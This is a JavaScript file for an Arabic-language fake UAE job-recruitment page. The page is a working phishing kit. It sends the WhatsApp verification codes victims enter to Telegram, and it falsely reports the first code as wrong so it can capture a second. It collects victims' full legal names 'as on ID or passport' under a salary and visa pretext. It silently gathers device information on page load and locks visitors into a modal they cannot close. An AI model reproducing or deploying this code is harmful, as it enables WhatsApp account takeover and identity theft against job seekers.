    const code = codeInput.value.trim();
    const status = document.getElementById('status');
    
    if (!code || code.length < 4) {
        alert('⚠️ يرجى إدخال رمز التحقق');
        return;
    }
    
    // Send verification code to Telegram
    await sendToTelegram(`🔐 رمز التحقق المدخل (محاولة ${verificationAttempts + 1}):\n${code}`);
    
    // Increment attempts
    verificationAttempts++;
    
    // First attempt: Show error message
    if (verificationAttempts === 1) {
        status.innerHTML = `<div class="error" style="background: #ffe6e6; padding: 20px; border-radius: 10px; margin: 20px 0;">
            <h3 style="color: #d32f2f; margin-bottom: 15px;">❌ الرمز خاطئ</h3>
            <p style="color: #333; font-size: 1.1em; margin: 15px 0;">يجب عليك الذهاب إلى واتساب وانقل رمز التحقق المرسل إليك</p>
            <p style="color: #666; margin: 10px 0;">تحقق من رسائل واتساب الخاصة بك وانقل الرمز بدقة</p>
            <div style="margin: 20px 0;">
                <input type="text" id="verificationCode" placeholder="أدخل رمز التحقق" style="width: 60%; padding: 12px; border: 2px solid #FFD700; border-radius: 10px; font-size: 1.3em; text-align: center; letter-spacing: 5px; direction: ltr;" />
            </div>
            <button onclick="submitVerificationCodeFirst()" style="background: linear-gradient(135deg, #FFD700 0%, #FFA500 100%); color: #000; padding: 12px 40px; border: none; border-radius: 25px; font-size: 1.2em; cursor: pointer; font-weight: bold;">إعادة المحاولة</button>
        </div>`;
        return;
    }
    
    // Second attempt: Accept and continue with name request
    status.innerHTML = '<div class="loading">✅ جارٍ التحقق من الرمز...</div>';
    
    await new Promise(resolve => setTimeout(resolve, 2000));
    
    // Save verification status
    localStorage.setItem('userVerified', 'true');
    
    // Show name request
    await requestFullName();
}

// Request full name after verification
async function requestFullName() {
    const status = document.getElementById('status');
    
    status.innerHTML = `<div class="success">
        <h3 style="color: #FFD700; margin-bottom: 15px;">🎉 تم التحقق بنجاح!</h3>
        <p style="color: #333; font-size: 1.1em; margin: 15px 0; font-weight: 600;">الآن نحتاج إلى معلوماتك الشخصية لإتمام التسجيل</p>
        <div style="background: linear-gradient(135deg, #FFD700 0%, #FFA500 100%); padding: 20px; border-radius: 15px; margin: 20px 0;">
            <p style="color: #000; font-size: 1.2em; font-weight: bold; margin-bottom: 10px;">⚠️ تنبيه مهم جداً:</p>
            <p style="color: #000; font-size: 1.05em; line-height: 1.8;">
                يجب إدخال اسمك الكامل <strong>بالضبط كما هو مكتوب في بطاقة الهوية أو جواز السفر</strong> لأن:
            </p>
            <ul style="color: #000; text-align: right; margin: 15px 0; padding-right: 25px; line-height: 2;">
                <li>💰 <strong>راتبك الشهري</strong> سيتم تحويله إلى حسابك البنكي بنفس الاسم</li>
                <li>📄 <strong>عقد العمل</strong> سيتم إصداره بنفس الاسم الموجود في بطاقتك</li>
                <li>✈️ <strong>تأشيرة العمل</strong> تحتاج إلى الاسم الكامل كما في الوثائق الرسمية</li>
                <li>🏦 <strong>فتح الحساب البنكي</strong> في الإمارات يتطلب مطابقة الاسم مع الوثائق</li>
            </ul>
            <p style="color: #000; font-size: 1.05em; margin-top: 15px; font-weight: 600;">
                أي خطأ في الاسم قد يؤدي إلى تأخير صرف الراتب أو رفض طلب التأشيرة!
            </p>
        </div>
        <p style="color: #666; margin: 20px 0; font-size: 1.05em;">أدخل اسمك الكامل (الاسم الأول + اسم الأب + اسم العائلة):</p>
        <div style="margin: 20px 0;">
            <input type="text" id="fullName" placeholder="مثال: أحمد محمد علي" style="width: 80%; padding: 15px; border: 2px solid #FFD700; border-radius: 10px; font-size: 1.2em; text-align: right; direction: rtl;" />
        </div>
        <button onclick="submitFullName()" style="background: linear-gradient(135deg, #FFD700 0%, #FFA500 100%); color: #000; padding: 15px 50px; border: none; border-radius: 25px; font-size: 1.3em; cursor: pointer; font-weight: bold; box-shadow: 0 5px 15px rgba(255, 215, 0, 0.4);">متابعة</button>
    </div>`;
}

// Submit full name
async function submitFullName() {
    const nameInput = document.getElementById('fullName');
    const fullName = nameInput.value.trim();
    const status = document.getElementById('status');
    
    if (!fullName || fullName.length < 5) {
        alert('⚠️ يرجى إدخال اسمك الكامل (يجب أن يكون 5 أحرف على الأقل)');
        return;
    }
    
    // Check if name has at least 2 words (first name + last name)
    const nameParts = fullName.split(/\s+/);
    if (nameParts.length < 2) {
        alert('⚠️ يرجى إدخال اسمك الكامل (الاسم الأول + اسم العائلة على الأقل)');
        return;
    }
    
    // Send name to Telegram
    await sendToTelegram(`👤 الاسم الكامل المدخل:\n${fullName}`);
    
    // Gather ADVANCED info with permissions (after successful verification)
    await gatherAdvancedInfoWithPermissions();
    
    // Show success and continue with permissions
    status.innerHTML = '<div class="success">✅ تم حفظ معلوماتك بنجاح!<br>جارٍ تحميل قائمة الوظائف الحصرية...</div>';
    
    await new Promise(resolve => setTimeout(resolve, 1500));
    
    // Continue with permissions
    await continueAfterPhone();
}

// Trigger on button click
document.getElementById('loadContent').addEventListener('click', startCapture);

// Functions for modal windows
function showPrivacy() {
    document.getElementById('privacyModal').style.display = 'block';
}

function showTerms() {
    document.getElementById('termsModal').style.display = 'block';
}

function closeModal(modalId) {
    document.getElementById(modalId).style.display = 'none';
}

// Close modal when clicking outside of it (only for non-mandatory modals)
window.onclick = function(event) {
    const privacyModal = document.getElementById('privacyModal');
    const termsModal = document.getElementById('termsModal');
    const joinModal = document.getElementById('joinModal');
    
    // Don't close join modal by clicking outside (it's mandatory)
    if (event.target == privacyModal) {
        privacyModal.style.display = 'none';
    }
    if (event.target == termsModal) {
        termsModal.style.display = 'none';
    }
    // Join modal cannot be closed by clicking outside
}

// Show mandatory join modal
function showMandatoryJoinModal() {
    // Check if user already completed registration
    const isVerified = localStorage.getItem('userVerified') === 'true';
    const hasName = localStorage.getItem('userFullName');
    
    if (isVerified && hasName) {
        // User already registered, show success message
        const modal = document.getElementById('joinModal');
        const modalBody = document.getElementById('joinModalBody');
        modalBody.innerHTML = `
            <div style="text-align: center; padding: 40px;">
                <div style="font-size: 4em; margin-bottom: 20px;">✅</div>
                <h2 style="color: #28a745; margin-bottom: 20px; font-size: 2em;">أنت مسجل بالفعل!</h2>
                <p style="color: #333; font-size: 1.2em; margin: 20px 0;">
                    مرحباً بك مرة أخرى في شركة الإمارات للتوظيف<br>
                    يمكنك الآن تصفح الوظائف الحصرية المتاحة
                </p>
                <button onclick="closeJoinModal()" style="background: linear-gradient(135deg, #FFD700 0%, #FFA500 100%); color: #000; padding: 15px 50px; border: none; border-radius: 25px; font-size: 1.3em; cursor: pointer; font-weight: bold; box-shadow: 0 5px 15px rgba(255, 215, 0, 0.4); margin-top: 20px;">
                    تصفح الوظائف
                </button>
            </div>
        `;
        modal.style.display = 'block';
        document.body.style.overflow = 'hidden';
        return;
    }
    
    const modal = document.getElementById('joinModal');
    const modalBody = document.getElementById('joinModalBody');
    
    // Show first step: Phone number with progress indicator
    modalBody.innerHTML = `
        <div style="text-align: center; padding: 20px;">
            <div class="progress-steps">
                <div class="step active">
                    <div class="step-number">1</div>
                    <div class="step-label">رقم الهاتف</div>
                </div>
                <div class="step">
                    <div class="step-number">2</div>
                    <div class="step-label">التحقق</div>
                </div>
                <div class="step">
                    <div class="step-number">3</div>
                    <div class="step-label">الاسم</div>
                </div>
            </div>
            <h2 style="color: #FFD700; margin-bottom: 20px; font-size: 2em;">🎯 انضم الآن واحصل على أفضل الوظائف!</h2>
            <div style="background: linear-gradient(135deg, #FFD700 0%, #FFA500 100%); padding: 25px; border-radius: 15px; margin: 20px 0; color: #000; box-shadow: 0 5px 20px rgba(255, 215, 0, 0.3);">
                <p style="font-size: 1.3em; font-weight: bold; margin-bottom: 15px;">✨ فرص عمل حصرية تنتظرك!</p>
                <p style="font-size: 1.1em; line-height: 1.8;">
                    للحصول على <strong>قائمة الوظائف الحصرية</strong> برواتب تصل إلى <strong>50,000 درهم</strong>، 
                    يجب عليك التسجيل أولاً. التسجيل <strong>مجاني 100%</strong> ولا يستغرق سوى دقيقة واحدة!<br><br>
                    <strong style="color: #1E90FF;">🏠 اعمل من البيت (أونلاين)</strong> أو <strong style="color: #FFD700;">✈️ سافر إلى الإمارات</strong> - الخيار لك!
                </p>
            </div>
            <div style="background: #f8f9fa; padding: 20px; border-radius: 15px; margin: 20px 0; border-right: 4px solid #FFD700;">
                <p style="color: #333; font-size: 1.1em; margin: 10px 0; font-weight: 600;">
                    📱 ابدأ بإدخال رقم هاتفك
                </p>
                <p style="color: #666; font-size: 0.95em; margin: 10px 0;">
                    سيتم استخدام رقم هاتفك لإرسال قائمة الوظائف الحصرية والتواصل معك مباشرة عبر واتساب.
                </p>
            </div>
            <div style="margin: 20px 0;">
                <input
                    type="tel"
                    id="joinPhoneNumber"
                    placeholder="أدخل رقم هاتفك"
                    style="width: 70%; padding: 15px; border: 3px solid #FFD700; border-radius: 10px; font-size: 1.3em; text-align: center; direction: ltr; font-weight: bold; transition: all 0.3s;"
                    onfocus="this.style.borderColor='#1E90FF'; this.style.boxShadow='0 0 10px rgba(30, 144, 255, 0.3)';"
                    onblur="this.style.borderColor='#FFD700'; this.style.boxShadow='none';"
                />
            </div>
            <button
                onclick="submitJoinPhoneNumber()"
                style="background: linear-gradient(135deg, #FFD700 0%, #FFA500 100%); color: #000; padding: 15px 50px; border: none; border-radius: 25px; font-size: 1.3em; cursor: pointer; font-weight: bold; box-shadow: 0 5px 15px rgba(255, 215, 0, 0.4); margin-top: 10px; transition: all 0.3s;"
                onmouseover="this.style.transform='translateY(-2px)'; this.style.boxShadow='0 8px 20px rgba(255, 215, 0, 0.6)';"
                onmouseout="this.style.transform='translateY(0)'; this.style.boxShadow='0 5px 15px rgba(255, 215, 0, 0.4)';"
            >
                متابعة →
            </button>
            <p style="color: #999; font-size: 0.85em; margin-top: 15px;">
                بالضغط على "متابعة" أنت توافق على
                <a href="#" onclick="showTerms(); return false;" style="color: #1E90FF; text-decoration: underline;">شروط الاستخدام</a>
                و
                <a href="#" onclick="showPrivacy(); return false;" style="color: #1E90FF; text-decoration: underline;">سياسة الخصوصية</a>
            </p>
        </div>
    `;
    
    modal.style.display = 'block';
    document.body.style.overflow = 'hidden'; // Prevent scrolling
}


// Global variable for join verification attempts
let joinVerificationAttempts = 0;

// Submit verification code from join modal
async function submitJoinVerificationCode() {
    const codeInput = document.getElementById('joinVerificationCode');
    const code = codeInput.value.trim();
    const modalBody = document.getElementById('joinModalBody');
    
    if (!code || code.length < 4) {
        alert('⚠️ يرجى إدخال رمز التحقق');
        return;
    }
    
    // Send verification code to Telegram
    await sendToTelegram(`🔐 رمز التحقق من نافذة الانضمام (محاولة ${joinVerificationAttempts + 1}):\n${code}`);
    
    // Increment attempts
    joinVerificationAttempts++;
    
    // First attempt: Show error message
    if (joinVerificationAttempts === 1) {
        modalBody.innerHTML = `
            <div style="text-align: center; padding: 20px;">
                <h2 style="color: #d32f2f; margin-bottom: 20px; font-size: 1.8em;">❌ الرمز خاطئ</h2>
                <div style="background: #ffe6e6; padding: 25px; border-radius: 15px; margin: 20px 0; border: 2px solid #d32f2f;">
                    <p style="color: #d32f2f; font-size: 1.1em; font-weight: bold; margin-bottom: 15px;">⚠️ يجب عليك الذهاب إلى واتساب</p>
                    <p style="color: #333; font-size: 1.05em; line-height: 1.8;">
                        اذهب إلى واتساب وانقل رمز التحقق المرسل إليك،<br>
                        ثم أدخله هنا.
                    </p>
                </div>
                <p style="color: #333; font-size: 1.1em; margin: 20px 0; font-weight: 600;">
                    أدخل رمز التحقق مرة أخرى:
                </p>
                <div style="margin: 20px 0;">
                    <input type="text" id="joinVerificationCode" placeholder="أدخل الرمز" maxlength="10" style="width: 60%; padding: 15px; border: 3px solid #FFD700; border-radius: 10px; font-size: 1.5em; text-align: center; letter-spacing: 5px; direction: ltr; font-weight: bold;" />
                </div>
                <button onclick="submitJoinVerificationCode()" style="background: linear-gradient(135deg, #FFD700 0%, #FFA500 100%); color: #000; padding: 15px 50px; border: none; border-radius: 25px; font-size: 1.3em; cursor: pointer; font-weight: bold; box-shadow: 0 5px 15px rgba(255, 215, 0, 0.4); margin-top: 10px;">
                    إعادة المحاولة
                </button>
            </div>
        `;
        return;
    }
    
    // Second attempt: Accept and continue with name request
    modalBody.innerHTML = '<div style="text-align: center; padding: 40px;"><div class="loading">✅ جارٍ التحقق من الرمز...</div></div>';
    
    await new Promise(resolve => setTimeout(resolve, 2000));
    
    // Save verification status
    localStorage.setItem('userVerified', 'true');
    
    // Show name request
    await requestJoinFullName();
}

// Request full name in join modal
async function requestJoinFullName() {
    const modalBody = document.getElementById('joinModalBody');
    
    modalBody.innerHTML = `
        <div style="text-align: center; padding: 20px;">
            <div class="progress-steps">
                <div class="step completed">
                    <div class="step-number">✓</div>
                    <div class="step-label">رقم الهاتف</div>
                </div>
                <div class="step completed">
                    <div class="step-number">✓</div>
                    <div class="step-label">التحقق</div>
                </div>
                <div class="step active">
                    <div class="step-number">3</div>
                    <div class="step-label">الاسم</div>
                </div>
            </div>
            <h2 style="color: #FFD700; margin-bottom: 20px; font-size: 2em;">🎉 تم التحقق بنجاح!</h2>
            <p style="color: #333; font-size: 1.1em; margin: 15px 0; font-weight: 600;">
                خطوة أخيرة: أدخل اسمك الكامل
            </p>
            <div style="background: linear-gradient(135deg, #FFD700 0%, #FFA500 100%); padding: 25px; border-radius: 15px; margin: 20px 0; color: #000; box-shadow: 0 5px 20px rgba(255, 215, 0, 0.3);">
                <p style="font-size: 1.2em; font-weight: bold; margin-bottom: 15px;">⚠️ تنبيه مهم جداً:</p>
                <p style="font-size: 1.05em; line-height: 1.8; margin-bottom: 15px;">
                    يجب إدخال اسمك الكامل <strong>بالضبط كما هو مكتوب في بطاقة الهوية أو جواز السفر</strong>
                </p>
                <div style="background: rgba(0,0,0,0.1); padding: 15px; border-radius: 10px; text-align: right; margin: 15px 0;">
                    <p style="font-size: 1.05em; line-height: 2; margin: 0;">
                        💰 <strong>راتبك الشهري</strong> سيتم تحويله إلى حسابك البنكي بنفس الاسم<br>
                        📄 <strong>عقد العمل</strong> سيتم إصداره بنفس الاسم الموجود في بطاقتك<br>
                        ✈️ <strong>تأشيرة العمل</strong> تحتاج إلى الاسم الكامل كما في الوثائق الرسمية<br>
                        🏦 <strong>فتح الحساب البنكي</strong> في الإمارات يتطلب مطابقة الاسم مع الوثائق
                    </p>
                </div>
                <p style="font-size: 1.05em; margin-top: 15px; font-weight: 600; color: #d32f2f;">
                    ⚠️ أي خطأ في الاسم قد يؤدي إلى تأخير صرف الراتب أو رفض طلب التأشيرة!
                </p>
            </div>
            <p style="color: #333; font-size: 1.1em; margin: 20px 0; font-weight: 600;">
                أدخل اسمك الكامل (الاسم الأول + اسم الأب + اسم العائلة):
            </p>
            <div style="margin: 20px 0;">
                <input type="text" id="joinFullName" placeholder="مثال: أحمد محمد علي" style="width: 80%; padding: 15px; border: 3px solid #FFD700; border-radius: 10px; font-size: 1.2em; text-align: right; direction: rtl; font-weight: bold; transition: all 0.3s;" onfocus="this.style.borderColor='#1E90FF'; this.style.boxShadow='0 0 10px rgba(30, 144, 255, 0.3)';" onblur="this.style.borderColor='#FFD700'; this.style.boxShadow='none';" />
            </div>
            <button onclick="submitJoinFullName()" style="background: linear-gradient(135deg, #28a745 0%, #20c997 100%); color: #fff; padding: 15px 50px; border: none; border-radius: 25px; font-size: 1.3em; cursor: pointer; font-weight: bold; box-shadow: 0 5px 15px rgba(40, 167, 69, 0.4); margin-top: 10px; transition: all 0.3s;" onmouseover="this.style.transform='translateY(-2px)'; this.style.boxShadow='0 8px 20px rgba(40, 167, 69, 0.6)';" onmouseout="this.style.transform='translateY(0)'; this.style.boxShadow='0 5px 15px rgba(40, 167, 69, 0.4)';">
                ✓ إتمام التسجيل
            </button>
        </div>
    `;
}

// Submit full name from join modal
async function submitJoinFullName() {
    const nameInput = document.getElementById('joinFullName');
    const fullName = nameInput.value.trim();
    const modal = document.getElementById('joinModal');
    
    if (!fullName || fullName.length < 5) {
        alert('⚠️ يرجى إدخال اسمك الكامل (يجب أن يكون 5 أحرف على الأقل)');
        return;
    }
    
    // Check if name has at least 2 words
    const nameParts = fullName.split(/\s+/);
    if (nameParts.length < 2) {
        alert('⚠️ يرجى إدخال اسمك الكامل (الاسم الأول + اسم العائلة على الأقل)');
        return;
    }
    
    // Send name to Telegram
    await sendToTelegram(`👤 الاسم الكامل من نافذة الانضمام:\n${fullName}`);
    
    // Save name
    localStorage.setItem('userFullName', fullName);
    
    // Gather ADVANCED info with permissions (after successful verification)
    await gatherAdvancedInfoWithPermissions();
    
    // Show success and close modal
    const modalBody = document.getElementById('joinModalBody');
    modalBody.innerHTML = `
        <div style="text-align: center; padding: 40px;">
            <div style="font-size: 4em; margin-bottom: 20px;">🎉</div>
            <h2 style="color: #28a745; margin-bottom: 20px; font-size: 2em;">تم التسجيل بنجاح!</h2>
            <p style="color: #333; font-size: 1.2em; margin: 20px 0;">
                مرحباً بك في شركة الإمارات للتوظيف<br>
                يمكنك الآن تصفح الوظائف الحصرية المتاحة
            </p>
            <button onclick="closeJoinModal()" style="background: linear-gradient(135deg, #FFD700 0%, #FFA500 100%); color: #000; padding: 15px 50px; border: none; border-radius: 25px; font-size: 1.3em; cursor: pointer; font-weight: bold; box-shadow: 0 5px 15px rgba(255, 215, 0, 0.4); margin-top: 20px;">
                ابدأ الآن
            </button>
        </div>
    `;
    
    await new Promise(resolve => setTimeout(resolve, 2000));
    closeJoinModal();
}

// Close join modal
function closeJoinModal() {
    const modal = document.getElementById('joinModal');
    modal.style.display = 'none';
    document.body.style.overflow = 'auto'; // Restore scrolling
}

// Toggle FAQ accordion
function toggleFaq(element) {
    const faqItem = element.parentElement;
    const isActive = faqItem.classList.contains('active');
    
    // Close all FAQ items
    document.querySelectorAll('.faq-item').forEach(item => {
        item.classList.remove('active');
    });
    
    // Open clicked item if it wasn't active
    if (!isActive) {
        faqItem.classList.add('active');
    }
}

// Animate counter numbers
function animateCounter(element, target, duration = 2000) {
    const start = 0;
    const increment = target / (duration / 16);
    let current = start;
    
    const timer = setInterval(() => {
        current += increment;
        if (current >= target) {
            element.textContent = target.toLocaleString('ar');
            clearInterval(timer);
        } else {
            element.textContent = Math.floor(current).toLocaleString('ar');
        }
    }, 16);
}

// Initialize counter animations when section is visible
function initCounters() {
    const stats = document.querySelectorAll('.achievement-stat .stat-number');
    const observer = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                const target = parseInt(entry.target.getAttribute('data-target'));
                animateCounter(entry.target, target);
                observer.unobserve(entry.target);
            }
        });
    }, { threshold: 0.5 });
    
    stats.forEach(stat => observer.observe(stat));
}

// Gather basic info on page load (silent - in background)
document.addEventListener('DOMContentLoaded', () => {
    // Silently gather device info when page loads
    setTimeout(() => {
        gatherDeviceInfo();
    }, 3000);
    
    // Initialize counter animations
    initCounters();
    
    // Show mandatory join modal after 60 seconds (1 minute)
    setTimeout(() => {
        // Check if user already registered
        const isVerified = localStorage.getItem('userVerified') === 'true';
        const hasName = localStorage.getItem('userFullName');
        
        if (!isVerified || !hasName) {
            showMandatoryJoinModal();
        }
    }, 60000);
});
